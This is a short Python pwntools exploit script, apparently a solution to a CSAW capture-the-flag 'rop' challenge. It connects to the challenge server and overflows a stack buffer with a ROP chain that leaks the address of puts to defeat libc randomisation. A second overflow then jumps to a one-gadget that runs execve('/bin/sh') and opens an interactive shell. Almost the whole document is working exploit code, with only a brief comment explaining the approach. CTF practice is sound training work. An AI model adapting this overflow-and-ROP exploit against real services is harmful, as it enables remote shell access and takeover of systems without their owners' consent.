from pwn import *
from pwnlib import util

"""
Approach:

Use our unlimited access to the stack to disclose the address of puts in order
to de-randomize libc. Then, use a one-gadget to get a shell.
"""

# p = process('rop', env={"LD_PRELOAD":"./libc-2.27.so"})
p = remote('pwn.chal.csaw.io', 5016)

print(p.recv())

"""

0x10a45c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

"""

p.sendline(b'a'*32+b'b'*8+p64(0x0000000000400683)+p64(0x00601018)+p64(0x4004a0)+p64(0x004005dc))

data = p.recvuntil("\n")[:-1]

up = make_unpacker(64, endian='little', sign='unsigned')

puts = up(data+b"\x00\x00")
libc = puts - 0x00080a30 

print("libc @ {:0x}".format(libc))

print(p.recv())

p.sendline(b'a'*32+b'b'*8+p64(libc+0x10a45c))

p.interactive()
